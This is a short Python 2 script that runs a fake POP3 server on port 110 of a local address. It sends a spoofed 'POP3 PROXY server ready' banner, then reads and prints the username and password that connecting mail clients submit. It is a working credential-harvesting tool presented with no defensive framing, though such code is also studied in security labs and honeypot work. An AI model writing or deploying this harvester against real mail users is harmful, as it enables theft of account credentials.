#!/usr/bin/env python
import socket
 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('192.168.1.100',110))
c.listen(1)
 
while 1:
    csock, caddr = c.accept()
    cfile = csock.makefile('rw', 0)
    print "Connection accepted."
    cfile.write("+OK POP3 PROXY server ready mail.server.com\r\n")
    line = cfile.readline().strip()
    print "USER: " + line
    cfile.write("+OK Password required\r\n")
    line = cfile.readline().strip()
    print "PASS: " + line